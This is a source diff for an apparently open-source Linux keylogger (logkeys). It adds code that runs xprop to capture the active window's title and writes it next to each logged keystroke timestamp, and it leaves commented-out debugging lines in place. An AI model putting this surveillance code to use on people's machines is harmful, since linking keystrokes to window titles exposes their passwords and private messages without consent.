@@ -49,6 +49,8 @@
 #define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
 #define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )
 #define COMMAND_STR_CAPSLOCK_STATE ("{ { xset q 2>/dev/null | grep -q -E 'Caps Lock: +on'; } || { setleds 2>/dev/null | grep -q 'CapsLock on'; }; } && echo on")
+#define COMMAND_GET_ACTIVE_WINDOW std::string("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME").c_str()
+#define COMMAND_GET_ACTIVE_WINDOW_BIS "xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME |  sed -nr 's/.*= \"(.*)\"$/\1/p'"
 
 #define INPUT_EVENT_PATH  "/dev/input/"  // standard path
 #define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
@@ -76,6 +78,22 @@ std::string execute(const char* cmd)
     return result;
 }
 
+std::string GetStdoutFromCommand(std::string cmd)
+{
+  std::string data;
+  FILE * stream;
+  const int max_buffer = 256;
+  char buffer[max_buffer];
+  cmd.append(" 2>&1");
+
+  stream = popen(cmd.c_str(), "r");
+  if (stream) {
+  while (!feof(stream))
+  if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
+  pclose(stream);
+  }
+  return data;
+}
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
 
@@ -583,6 +601,22 @@ int main(int argc, char **argv)
           strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
           inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
         }
+
+        // add current active window
+
+        std::string active_window =  execute(COMMAND_GET_ACTIVE_WINDOW);
+        // std::string active_window =  execute(std::string("ls").c_str());
+        // const char* active_window =  "Hello";
+        inc_size += fprintf(out, " [ %s ]", active_window.c_str());
+        // inc_size += fprintf(out, " 1 [ %s ]", execute(COMMAND_GET_ACTIVE_WINDOW).c_str());
+        // inc_size += fprintf(out, " 2 [ %s ]", execute(COMMAND_GET_ACTIVE_WINDOW));
+        // inc_size += fprintf(out, " 3 [ %s ]", execute(COMMAND_GET_ACTIVE_WINDOW_BIS));
+        // inc_size += fprintf(out, " 4 [ %s ]", execute(COMMAND_GET_ACTIVE_WINDOW_BIS).c_str());
+        // inc_size += fprintf(out, " 5 [ %s ]", std::string(execute(COMMAND_GET_ACTIVE_WINDOW_BIS)));
+        // inc_size += fprintf(out, " 6 [ %s ]", std::string(execute(COMMAND_GET_ACTIVE_WINDOW_BIS)).c_str());
+
+
+
         if (inc_size > 0) file_size += inc_size;
         continue;  // but don't log "<Enter>"
       }
